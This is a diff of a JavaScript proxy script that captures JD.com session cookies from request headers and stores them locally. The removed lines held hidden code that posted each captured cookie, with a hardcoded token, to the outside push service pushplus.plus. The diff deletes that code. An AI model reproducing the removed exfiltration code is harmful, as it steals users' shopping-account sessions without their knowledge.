@@ -1,44 +1,22 @@
 
 const $ = Env("JD Cookie")
 
-
-
-
 !(async () => {
-    $.log('', `🔔 ${$.name}, 获取会话: 开始!`, '')
-    const JD_COOKIE = $request.headers['Cookie'] || $request.headers['Cookie']
+    $.log(`++++++++++ 【${$.name} 开始】 ++++++++++`)
+    const JD_COOKIE = $request.headers['Cookie'] || $request.headers['cookie']
     if (JD_COOKIE) {
-
-        console.log(`old cookie: ${$.getdata('JO_JD_COOKIE')}`)
-        if ($.getdata('JO_JD_COOKIE') && JD_COOKIE === $.getdata('JO_JD_COOKIE')) {
-            $.subt = '获取会话: 相同的Cookie!'
-        } else {
-            $.setdata(JD_COOKIE, 'JO_JD_COOKIE')
-            $.subt = '获取会话: 成功!'
-            $.log(`❌ ${$.name}, 获取会话: 成功! 结果: ${JD_COOKIE}!`)
-
-            let option = {
-                url: "http://www.pushplus.plus/send/", // URL，必须
-                body: {
-                    "token": "77e6a8a246dd4c8c9fa561c4c23293d6",
-                    "title": "标题12",
-                    "content": `${JD_COOKIE}`,
-                    "topic": "test",
-                    "template": "txt"
-                }
-            }
-
-            $.post(option)
-        }
+        $.setdata(JD_COOKIE, 'JO_JD_COOKIE')
+        $.subt = '✅ 获取会话: 成功!'
+        $.log(`📢 ${$.name}, 获取会话: 成功!`)
     } else {
-        throw "无法冲请求中获取cookie"
+        throw "无法获取cookie字段"
     }
 })().catch((e) => {
-    $.subt = '获取会话: 失败!'
+    $.subt = '❌ 获取会话: 失败!'
     $.desc = `原因: ${e}`
-    $.log(`❌ ${$.name}, 获取会话: 失败! 原因: ${e}!`)
+    $.log(`📢 ${$.name}, 获取会话: 失败! 原因: ${e}!`)
 }).finally(() => {
-    $.msg($.name, $.subt, $.desc), $.log('', `🔔 ${$.name}, 获取会话: 完成!`, ''), $.done()
+    $.msg($.name, $.subt, $.desc), $.log(`++++++++++ 【${$.name}】 结束 ++++++++++`), $.done()
 })
 
 
